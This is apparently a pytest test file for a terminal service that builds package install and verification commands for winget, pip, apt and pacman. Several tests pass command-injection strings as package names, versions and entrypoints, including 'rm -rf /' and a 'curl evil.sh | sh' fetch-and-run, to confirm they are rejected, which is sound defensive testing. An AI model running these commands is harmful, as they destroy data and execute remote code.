import pytest
from services.terminal.command_templates import build_install_command, build_verification_command
from services.terminal.errors import InvalidRequestError


def test_build_install_command_winget():
    argv = build_install_command("winget", "dig", "9.18")
    assert argv[0] == "winget"
    assert "--id" in argv and "dig" in argv
    assert "--version" in argv and "9.18" in argv


def test_build_install_command_pip_uses_current_interpreter():
    import sys

    argv = build_install_command("pip", "requests")
    assert argv[0] == sys.executable
    assert argv[-1] == "requests"


def test_build_install_command_pip_pins_version():
    argv = build_install_command("pip", "requests", "2.31.0")
    assert argv[-1] == "requests==2.31.0"


def test_build_install_command_rejects_invalid_package_name():
    with pytest.raises(InvalidRequestError):
        build_install_command("apt", "dig; rm -rf /")


def test_build_install_command_rejects_invalid_version():
    with pytest.raises(InvalidRequestError):
        build_install_command("apt", "dig", "1.0 && curl evil.sh | sh")


def test_build_install_command_rejects_unsupported_package_manager():
    with pytest.raises(InvalidRequestError):
        build_install_command("choco", "dig")


def test_build_verification_command_prefers_entrypoint():
    argv = build_verification_command("apt", "dig", entrypoint="dig")
    assert argv == ["dig", "--version"]


def test_build_verification_command_rejects_invalid_entrypoint():
    with pytest.raises(InvalidRequestError):
        build_verification_command("apt", "dig", entrypoint="dig; rm -rf /")


def test_build_verification_command_falls_back_to_package_manager_query():
    argv = build_verification_command("pacman", "dig")
    assert argv == ["pacman", "-Q", "dig"]


def test_argv_is_always_a_list_never_a_shell_string():
    argv = build_install_command("apt", "dig")
    assert isinstance(argv, list)
    assert all(isinstance(part, str) for part in argv)
